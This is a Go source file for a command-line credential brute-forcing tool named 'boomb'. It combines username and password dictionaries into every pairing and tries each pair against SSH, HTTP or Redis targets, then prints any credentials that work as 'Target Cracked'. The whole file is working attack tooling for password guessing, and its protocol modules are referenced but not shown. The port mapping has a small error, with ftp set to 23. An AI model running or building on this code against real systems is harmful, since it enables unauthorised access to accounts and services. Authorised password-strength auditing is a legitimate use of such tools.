package main

import (
	"./config"
	"./src"
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
)

func Fire( fire func(*models.Try) *models.Try, trys []*models.Try) *models.Boomb {
	for _, try := range trys {
		result := fire(try)
		if result != nil && result.Status {
			fmt.Println("[Target Cracked] \nusername:password = ", result.Data.Username,":",result.Data.Password)
			return &models.Boomb{result.Data.Username,result.Data.Password}
		}
	}
	return nil
}

func ArrangeSlic( usernames *[]string, passwords *[]string, result *[]models.Boomb) *[]models.Boomb {

	for _, user := range *usernames {
		for _,pass := range *passwords {
			*result = append(*result, models.Boomb{user,pass})
		}
	}
	return result
}

func ReadDictFile(user string, authtickes *[]string) *[]string{

	username, err := os.Open(user)
	if err != nil {
		log.Fatal(err)
	}

	defer username.Close()

	scanner := bufio.NewScanner(username)

	for scanner.Scan() {
		*authtickes = append(*authtickes,scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return authtickes
}

func ParserTarget(target string) models.Try {
	var info models.Try
	parser, err := url.Parse(target)

	if err != nil {
		panic(err)
	}
	host, port, _ := net.SplitHostPort(parser.Host)

	if host == ""{
		fmt.Println("Target Host Not Right")
		os.Exit(1)
	}

	info.Target = host
	info.Protocal = parser.Scheme

	if port == "" {
		if parser.Scheme == "http" {
			info.Port = "80"
		}
		if parser.Scheme == "https" {
			info.Port = "443"
		}
		if parser.Scheme == "ssh" {
			info.Port = "22"
		}
		if parser.Scheme == "ftp" {
			info.Port = "23"
		}
	}else{
		info.Port = port
	}
	return info
}

func LoadAttack(userdict string, passdict string, targetinfo models.Try) []*models.Try{
	var user []string
	var pass []string
	var trys []*models.Try
	var boomb []models.Boomb

	usernames := &user
	passwords := &pass
	boombs := &boomb

	if models.IsFileExists(userdict) {
		usernames = ReadDictFile(userdict, usernames)
	}else {
		*usernames = append(*usernames, userdict)
	}

	if models.IsFileExists(passdict) {
		passwords = ReadDictFile(passdict, passwords)
	}else {
		*passwords = append(*passwords, passdict)
	}

	boombs = ArrangeSlic(usernames, passwords, boombs)

	for _,boomb := range *boombs {
		crackdata := models.Try{targetinfo.Target, targetinfo.Port,targetinfo.Protocal, &boomb, false}
		trys = append(trys, &crackdata)
	}
	return trys
}


func main() {


	tragetPtr := flag.String("target", "", "Boombed target.")
	userPtr := flag.String("user", "", "Boomb target's username or username file.")
	passPtr := flag.String("pass", "", "Boomb target's password or password file.")
	flag.Parse()

	if *tragetPtr == "" || *userPtr =="" || *passPtr==""{
		flag.Usage()
		os.Exit(1)
	}

	targetInfo := ParserTarget(*tragetPtr)
	boombs := LoadAttack(*userPtr, *passPtr, targetInfo)

	switch targetInfo.Protocal {
	case "ssh": Fire(burp.SSHBrust, boombs)
	case "http": Fire(burp.HTTPBrust, boombs)
	case "redis": Fire(burp.REDISBrust, boombs)

	default:
		fmt.Println("useage: ")
		fmt.Println("\tboomb  --target http://127.0.0.1:8080 --user yourusername --pass test/pass.list")
		fmt.Println("\tboomb --target ssh://127.0.0.1:2222 --user test/user.list --pass yourpassword")
		fmt.Println("\tboomb --target redis://127.0.0.1:6379 --user test/user.list --pass yourpassword")

	}
}